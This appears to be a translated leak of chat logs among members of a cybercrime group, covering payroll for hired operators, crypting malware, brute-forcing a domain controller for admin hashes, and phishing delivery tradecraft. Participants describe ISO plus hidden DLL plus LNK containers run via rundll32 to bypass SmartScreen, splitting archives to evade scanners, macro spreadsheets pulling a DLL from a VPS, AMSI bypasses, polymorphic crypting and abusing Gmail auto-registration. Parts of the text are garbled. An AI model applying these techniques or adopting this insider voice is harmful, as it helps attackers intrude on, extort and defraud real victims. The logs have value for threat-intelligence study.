that's why the noise is going on, the salvador is going to go to the state, the chinese are banning it, the sbercoin is showing up.
October november
I don't really care about the exchange rate. Since my main thing is to increase the coin.
The fat guys behind the closed doors have decided everything)))) we just have to guess what will happen
The bitcoin needs to grow and the digital dollar needs to grow in proportion.
Well, everyone's a little wary of crypto.
If the rate fell, I bought some bitcoins, if the rate went up, I sold them, but this is trading and investing.
But this is trading and investing.
That sucks.
\Tomorrow they'll take it away from you and what are you gonna do?
You have to look for the points where you're getting charged.
and get it out of the trusted guys.)
It could be instant X's, but the main thing is that it's guaranteed.
It's better to overpay a few percent, but not by yourself.
Might even take away your life
Life should not be taken away)
while at this point we have already discussed, is the ability to work with people
with any amount. If there are bits
Well, good) we'll deal with the bits
And they need to grow. Not on the course but on operations.
I'm going to bed.
Good night.
Good night. I'll come to you first if I'm busy.

Hey, do you pay salaries on steven's team
If I'm hiring people from HR.
can you pay them or...
Yeah. .
Do I have to pay them myself?
If you agree with S, of course I can.
We pay part of it. They pay part of it.
It depends on who's bringing who.
What are their salaries?
1500 ?
+ bonuses, I understand.
I want to get 10 people.
At first we pay 1.5k yes
After that, they're supposed to switch to %.
S is rarely online, but I think he offered me
I'll ask him when i catch him and i'll let him know

so i gave it to reverse
he's got it tight there
Can you give him a contact?
I thought you guys were from the same chat room, no?
We'd probably take him too.
We have different teams.
He's got 60 people there.

Hi, and sorry to bother you
when you select a contact from a table, do you want to see data such as json, or well designed (html).
when we click an item in the table, I generate fields that are non-zero and visualize them, and create a button to load the json file.
I'm just testing, after I put everything in git
correct me if something is wrong

hello
here?
hi
I was walking around today.
I think this is it)
I used to sit around and look for options to get results
made plans, dreams were made))
common goals with someone off-line)
now everything materializes in a moment.
everything's fine.
from boredom.
I come to the office
and I'm sitting there reading schematics and thinking about what to do and how to do it.
♪ in short  ♪
♪ what I walked away from ♪
♪ that's what I came back to ♪
so I don't lose my mind
)))))))))))))
life is surreal)))
only with the condition in the game already
♪ the world used to bend you over ♪
and now it doesn't distract you with needs and wants
but you're still doing the same thing you were doing)))
13th floor

))))
I'm sorry I'm writing to you.
))))))))
others won't understand)))) have already been told to fuck off)))
a long time ago))
hors@ no answer by the way, he was my hope))
and you left me here)
i don't believe in ransom for the big results
but i do believe in crypto or something
♪ that'll give you big wins ♪
and results
shared
and make the brain work.
I've been thinking.
We used to make 1-10-50k.
♪ it doesn't matter ♪
and our brains are used to earning that much
it was clear what to do
with the money received
and what schemes to do
and so for years
dozens of years
different periods different situations
offline for many years
then online with you
and then life abruptly gives you opportunities.
everything adds up
and money becomes xxxxxxxxxxxx
and then situations and events
that multiply it to xxxxxxxxxxxxxx
and you're kind of reflecting on the past
patterns of the past
but logically you realize
that going back to 1-10-50x schemes
it's a regression
and your brain doesn't fucking know anything new
what to do
and your universe is falling apart
who you are what you are
♪ why did you live, what did you do and what was it all about? ♪
)))))) sounds like I've been smoking ben))
♪ but I wouldn't believe it if you didn't go through with it ♪
♪ there's a floor out there ♪
Kevin
troy
They're fucking great.
they clearly know that when they buy themselves a new watch.
♪ they know they didn't live their lives in vain ♪
Well, Troy, I doubt it.
He said he's a little confused about what's going on.
but you bought a watch and you don't know what it's for
because you don't give a fuck about anyone telling you how cool the watch is.
it doesn't make your life better or worse.
That's my question in the note.
Is it really possible to move on
without being surrounded by people
that understands what you're talking about
and what's going on in your life)
and the vector of movement
no real vector))
or it's all in the old schemes.
circuits
or it's in the new schemes where gathered the same people with the same questions that I raised and there have already found answers maybe)))
in general forget the conversation)))
why am I here)
to find answers to questions
No one forced me to.
♪ and I'm the only one who knows the answer ♪
I'm here myself
♪ to answer the question to myself ♪
why am I here
and what I want
da
pay for the server?
they don't crypt there anymore?

hi
I'll find out.

Hi
Listen, have you worked with Sphinx?
Or any other search engines?
hi, but i've worked with mnogosearch extensively.
Sphinx was set up for site search.
But that was like 7 years ago.
I mean, there were older versions.
what about it?
but it's easier to search there, it's through spider
I can not solve the problem with the sphinx, I've searched all the forums and asked everyone I could
There is roughly speaking Url and a piece of Url it does not seek no matter what I do.
Shielding does not help, changing the format of the fields and the index, too

Hi man, I'm pausing the accesses for now!
i uploaded the patcher yesterday.
send me the credentials.
That's good, I'll be able to look later.
What about the patches on those tascas?
I'm making one at .
You also uploaded?
Seems like everything's fine.
Ok, you've got one more small patch there to change the width of the field and nothing else in the plan this week.
It's cool that you came up with the patcher yet.
Yeah I saw that.
I'll try to close the sprint on time.
If you can make it on time, good, no next week it means. On Mon we'll discuss what to do next
I try to make the job easier)
)
engineers are lazy people)
i used to work as a cryptor, and every day i was crypting software, but i got so fed up, that i wrote an autocrypt polymorphic one, which was clean for almost 6 months, and i just watched movies)
Hi)
listen, please give me the firm that the first guy couldn't handle
:) Cool experience.
Basically, a good job is when things are stable.
Not when people are exhausted and in overdrive.
That's what you should strive for.
I agree.
We've got to get things in order here, too.
I've seen this place run like demons.
That's not good.
because I switched laptops and lost my firm.

Hi, I will ask until Wednesday to organize all the tests and get the result to work like clockwork in terms of issuing software and lending
then according to the tried and tested scheme you have soft + lend with Dave working every day, preparation of crypts, etc. and Bentley clearly understand what to do with the deplot and others
and operators work off objects and my deputy here

Why do I ask until Wednesday, I may have to be out of sight for a week and want everything to work here for the common good

I understand that everyone is busy with projects and their tasks, and here I fall out of the sky and press on

Hello, I will ask until Wednesday to organize all the tests and get the result to work like clockwork in terms of issuing software and lending
then according to the tried and tested scheme you have soft + lend with Dave working every day, preparation of crypts, etc. and Bentley clearly understands what to do with the depletion and others
and operators work off objects and my deputy here

Why do I ask until Wednesday, I may have to be out of sight for a week and want everything to work here for the common good

I understand that everyone is busy with projects and their tasks, and here I fall out of the sky and press on

hi
I'm gonna ask you to leave Dave out of this until Wednesday...
until he and Lande figure things out.
let him get involved in the process.
And if he doesn't, that's fine.
I know I just dropped out of the sky on your head.
If it's over, you'll be swamped by the operators
You guys decide amongst yourselves.
it looks like i will have to disappear for a week or not, if there is anything my castle will be here with the operators
notes under the door, under the windshield, they want to talk, comrades say not to worry and decide on the fact
so with you, but you need to understand whether it's worth it or not for your productive work, and without the work of the line and the whole chain it is impossible to understand
yeah
We'll work on it, and then we'll see.
It all sounds like a plan of action.
I've been warned about.
Okay. .
I want to avoid stress for a few months.
And to do that, we have to go on vacation with you as a team.
I wonder when they'll run out of patience)
We'll see.

Hello
The cars have spread.

What's up?
The smb port is supposedly closed
on all the servers
Or maybe it's the firewall's way
fuckin' hell!
what else is there besides samba
i already forgot there was some protocol
there's an rdp, i think
we're bruteforcing the dk
all the passwords.
but not a single admin hash on the vorks
and we've searched a hundred of them)
Fuck!
Didn't that old one come in?
Which one's ?
Yeah, there was another one that went off the grid.
but he knocked on the cortex.
I have it on a different virtualt working
so far, the vrts are on with the code.
only the big one is still there

it's already a mess on the part of the coders and servers here
as usual
gecnm j
i don't see him in the rocket
it's a mess, no one is responsible for anything and so on
Tell him to contact me, we'll exchange contacts
I'll solve all the problems with the shooters
I'll make an important point.
All are busy with their tasks, used to do what they do and everyone delegates to another)
so once they're all sorted out amongst themselves)))))
then the operators will start calling
it is not clear when it will be.
let's wait another week.
[15:08:02] <buza> have him contact me, let's exchange contacts

hi)
Hi
Bingo)
Listen, do you happen to have any ready-made base of random names?
First name, last name, I mean.
I can give you one right now.)
hi
You know where I get it.
I also need a crypt with bytes.
tell telnet I asked for a group with which bytes you can change information in the crypt from which to which bytes
Go ahead, suggest a place, I'd appreciate it.
https://www.fakenamegenerator.com/order.php
You just set the parameters.
and the file comes in the mail.
Great!) Thanks already see that I have this resource is clearly useful and more than once)
Up to 50-100k options can be done
Yes, I often use it))
)) thanks again
you're welcome)

Anyway, let's do this. I've missed something in the year I've been busy in real life, but I have some base too. We can try to find intersections of mutual benefit

" [19:08:15] <rozteka> I have docked for a very long time and can't find someone to do
There is a dock.
Somehow, but it works.
Dock def bypasses?
Yes, of course. The most important criterion.
We used to have a better one, but that person is no longer in the thread. There are questions about what we have, but it still works and is clean enough.
My locker and dock used to be twittered too.
Ostap was a looder.
<Hash> I'm starting to fool around with webmail now, it has an implementation of google drive link
[19:10:28] <Hash> But I don't know shit about it.
Who's there to consult?
formulate your question.
A link to the drive. What's being posted there? An archive/naked attachment? Is it just one link or a bunch of links?
From what I recertified yesterday.
archive
It doesn't matter what drive.
I can tell you about it on the Wonder Drive.
it's essentially a chrome bypass.
so there's no alert and the download drops right away.
to a folder on the victim's machine.
Yeah, that's probably it.

"Link one or do they generate a bunch at once?
Maybe there are automators. on some zennoPoster either on the forum or on order to leave. myself have not seen.
there is an apploader on your drive
pay attention
on prometheus
on the expe for 200 or so.
rocket's down
i would be very grateful to you if you could help me build the doc. what do i have to do?
The only thing that confuses me is the archive. It's just, I'm back in the good old days when archives and other crap weren't necessary if you had a good dock. And compared to a dock, an archive with the same almost but crappy dock gave less results
10 minutes, I'll be back to tell you.
I understand. .
There's another trick, you know.
You send the archive.
And there's a .js in it.
and you're detected immediately by the extension
How do you get around it? It's easy.
Archive, and it slices the archive into 2-3-4-5 parts (5-10 Kbytes each). opening the first one, the following ones will be downloaded and it goes through the victim and cuts off keyword analyzers.
Read more you know what to train your mind
Nobelium attack
on mikrosoft description. I stole from there the method with ISO + hidden DLL + LNK
stole *

"ISO + hidden DLL + LNK
This is a kind of container turns out?
Simply, there is such a suggestion for an attachment. Let's call it a "container". I haven't had time to evaluate it.
There is also an ink in it.
Yes. The link to bypass the smart screen and run randll32 1.dll.
And the result? Or is this way out of date?
So far it's been the most penetrating.
I've been doing the technique before.
js vbs exe
In general look, under the dock, or to be more specific, it's not a dock but an xlsm table. You only need a vps to put out the dll. There is one problem with this xlsm - no protection. I can advise you to use black tds as an anti-bot protection
js vbs might still make sense but you need someone who can bypass amsi
OK, so I need the domain and the file to the DLL, right?
What's your entry point?
You can use any entry point you want. Just let me know if it differs from your default one.
[Error: message encrypted and cannot be decrypted.]
Okay. I'll leave the domain with the I.P.S. on the order now.
[Error: message is encrypted and cannot be decrypted.]
I don't need the domain.
Just a link with an ip.
Well you can with domain if you want :)
I got it. I put it on the order.
Also, check this out.
We used to use Js a lot back in the day.
https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/
fellow spammers. all the tricks at once.
We had a js loeder with a defense package packed in the dock.
There was a protection package against letting the maiload itself go where it shouldn't.
like process check, snapbox detection?
Yes
Plus network detection, number of machines on the network if it's not a single machine.
Av, network...
That was the ostap loader.
So we already had a clear idea of what and where to load, without all the fiddling.
Now we can't do it?
[Error: the message is encrypted and cannot be decrypted.]
[Error: message encrypted and impossible to decrypt.]
You can only implement it if you have the right level of coder. There are no such coders for two reasons. 1. We all got into a fight at some point. 2. The coder at some point realized that everything went too far and after reading a couple of revelations showed a Bender's Ostap style trick and disappeared.
What language do you need the coder in?
Js

"The coder realized at some point that things had gone too far.
he didn't know what he was doing and he was on 1k a month, right? :)
No, he knew and he wasn't 1k a month :)
It's just that his cuff was getting tight.
why the fuck are you leaving us, we're on top terms imho
we can use almost any volume we want
♪ and no shovelnuts ♪
Well, the conditions are top, but everyone's got different nerves. There were 3 of us in the team. 2 of them left for the above reason.
One even at the end of September, appeared, wrote something like "there's a fuckin' hood here" went somewhere off
What can I say? There's an opinion.
Maybe he had some kind of insider tip.
or maybe he's on drugs, I don't know.)
Yes, I think the type of a normal and known for a long time before the trike.
I don't know what's up with him.
Maybe he saved up and thought enough
I'm having trouble with the Internet.
I'll look at the links you sent me on the methods later.
Maybe I'll learn something for myself.
Greetings. .
Hi. .
How many copies do you need?
10 to start.
I usually make copies for myself with different hashes.
1-3к
Okay, I'll do it when you give me the link tomorrow.
But I'd still advise you to protect yourself.
Otherwise you'll get so much slag you'll go nuts.
Hey, what do you know about this guy?
I sent him to you.
joynses@thesecure.biz
[20:21:39] <Hash> And about loader, analogue of what we had once before. It's not only lowader coder you need. You also need a person who makes docks and understands how to "wrap" this looder in the dock. The local docker has no such capabilities.
I've already learned everything there, as I started going back to work.
So I'm stumped on this one.

Hi.

Is your tracker working?
to the tech guy, copy of the report to max.
===================

gmail autoreg works, but they block the account, saying it was created by the program

Using tshark I record traffic without and with autoreg, compare each packet, analyze the difference in traffic, the volume of conversions is very large, this is business in a nutshell

I didn't upload it to the git, it's all on the server

I was talking to an american guy, and I encouraged him to hack into Google, but he fell off after a week, he got scared.

I think the difference in traffic and its deciphering should give a positive result

I have brought the automation to full perfection, just need to identify and "bite" google tokens

DocuSign
